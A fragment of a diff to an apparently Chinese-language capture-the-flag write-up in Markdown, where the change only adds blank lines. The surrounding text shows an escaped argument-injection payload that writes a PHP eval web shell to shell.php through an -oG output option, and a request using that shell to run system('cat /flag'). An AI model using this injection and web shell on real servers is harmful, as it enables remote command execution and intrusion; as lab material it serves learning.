@@ -70,9 +70,11 @@ OUTPUT:
 ''\\''\<\?php eval\(\$_GET\["cmd"\]\)\;\?\> -oG shell.php '\\'''
 ```
 即可被解析
+
 ![[Pasted image 20221113194543.png]]
 ```php
 /xxx/shell.php?cmd=system('cat /flag');
 ```
 ![[Pasted image 20221113194826.png]]
+
 #Web #PHP #RCE #shell
